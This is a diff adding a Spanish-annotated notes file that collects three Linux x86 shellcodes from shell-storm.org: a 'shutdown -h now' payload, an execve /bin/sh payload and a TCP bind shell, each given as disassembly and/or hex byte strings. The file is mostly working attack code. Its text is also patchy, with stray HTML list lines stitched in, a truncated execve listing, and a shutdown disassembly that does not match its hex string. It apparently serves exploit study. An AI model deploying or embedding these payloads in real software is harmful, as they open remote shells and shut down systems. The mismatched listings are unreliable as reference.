@@ -1,0 +1,88 @@
+----------------------------------------------------------------------
+http://shell-storm.org/shellcode/files/shellcode-876.php  - verificado
+----------------------------------------------------------------------
+00000000  31C0              xor eax,eax
+00000002  31D2              xor edx,edx
+00000004  50                push eax
+00000005  66682D68          push word 0x682d
+00000009  89E7              mov edi,esp
+0000000B  50                push eax
+0000000C  6A6E              push byte +0x6e
+0000000E  66C74424016F77    mov word [esp+0x1],0x776f
+00000015  89E7              mov edi,esp
+00000017  50                push eax
+00000018  68646F776E        push dword 0x6e776f64
+0000001D  6873687574        push dword 0x74756873
+00000022  686E2F2F2F        push dword 0x2f2f2f6e
+00000027  682F736269        push dword 0x6962732f
+0000002C  89E3              mov ebx,esp
+0000002E  52                push edx
+0000002F  56                push esi
+00000030  57                push edi
+00000031  53                push ebx
+00000032  89E1              mov ecx,esp
+00000034  B00B              mov al,0xb
+00000036  CD80              int 0x80
+
+\x31\xc0\x31\xd2\x50\x66\x68\x2d\x68\x89\xe6\x50\x6a\x6e\x66\xc7\x44\x24\x01\x6f\x89\xe7\x50\x68\x64\x6f\x77\x6e\x68\x73\x68\x75\x74\x68\x6e\x2f\x2f\x2f\x68\x2f\x73\x62\x69\x89\xe3\x52\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80
+
+>>> '6e776f64747568732f2f2f6e6962732f'.decode('hex')[::-1]
+'/sbin///shutdown'
+
+El original fue modificado, la línea 00000009 se sustituyó "mov edi, esp" por "mov esi, esp"
+
+/*
+; Title: shutdown -h now Shellcode - 56 bytes
+; Date: 2014-06-27
+; Platform: linux/x86
+; Author: Osanda Malith Jayathissa (@OsandaMalith)
+
+
+----------------------------------------------------------------------
+http://shell-storm.org/shellcode/files/shellcode-555.php  - verificado
+----------------------------------------------------------------------
+
+<li><a href="/shellcode/files/shellcode-555.php">Linux/x86 - execve() - 51bytes</a> <i>by fl0 fl0w</i></li>
+
+00000000  EB1A              jmp short 0x1c
+00000002  5E                pop esi
+00000003  31C0              xor eax,eax
+00000005  884607            mov [esi+0x7],al
+00000008  8D1E              lea ebx,[esi]
+0000000A  895E08            mov [esi+0x8],ebx
+0000000D  89460C            mov [esi+0xc],eax
+00000010  B00B              mov al,0xb
+00000012  89F3              mov ebx,esi
+00000014  8D4E08            lea ecx,[esi+0x8]
+00000017  8D560C            lea edx,[esi+0xc]
+0000001A  CD80              int 0x80
+0000001C  E8E1FFFFFF        call 0x2
+00000021  2F                das
+00000022  62696E            bound ebp,[ecx+0x6e]
+00000025  2F                das
+00000026  7368              jnc 0x90
+00000028  4A                dec edx
+00000029  41                inc ecx
+0000002A  41                inc ecx
+0000002B  41                inc ecx
+0000002C  41                inc ecx
+0000002D  4B                dec ebx
+0000002E  4B                dec ebx
+0000002F  4B                dec ebx
+00000030  4B                dec ebx
+
+----------------------------------------------------------------------
+http://shell-storm.org/shellcode/files/shellcode-847.php
+----------------------------------------------------------------------
+/*
+
+Title   : tcpbindshell  (108 bytes)
+Date    : 15 May 2013
+Author  : Russell Willis &lt;codinguy@gmail.com&gt;
+Testd on: Linux/x86 (SMP Debian 3.2.41-2 i686)
+
+$ objdump -D tcpbindshell -M intel
+
+tcpbindshell:     file format elf32-i386
+<li><a href="/shellcode/files/shellcode-847.php">Linux/x86 - TCP bind shell - 108 bytes</a> <i>by Russell Willis</i></li>
+"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x52\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2\xb0\x0b\xcd\x80"
